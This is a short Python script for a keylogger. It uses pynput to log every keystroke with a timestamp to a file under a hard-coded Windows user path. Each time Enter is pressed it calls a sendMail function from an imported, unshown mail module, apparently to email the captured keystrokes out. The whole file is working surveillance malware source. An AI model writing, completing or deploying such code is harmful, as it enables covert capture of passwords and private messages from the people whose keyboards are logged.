# ........... this code is written in python ................... 

from pynput.keyboard import Key,Listener
import logging

#  importing our mail.py file
import mail

log_dir = r"C:\Users\yathartha singh\Desktop\py\keylogger"
logging.basicConfig(filename = (log_dir + "\keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))
    # sending mail when user press enter button..
    if(key == Key.enter):
        # firing the sendMail function of our Mail() class in mail.py
        mail.Mail().sendMail()

with Listener(on_press=on_press) as listener:
    # continuous listing for keyboard key pressing event..
    listener.join()
    

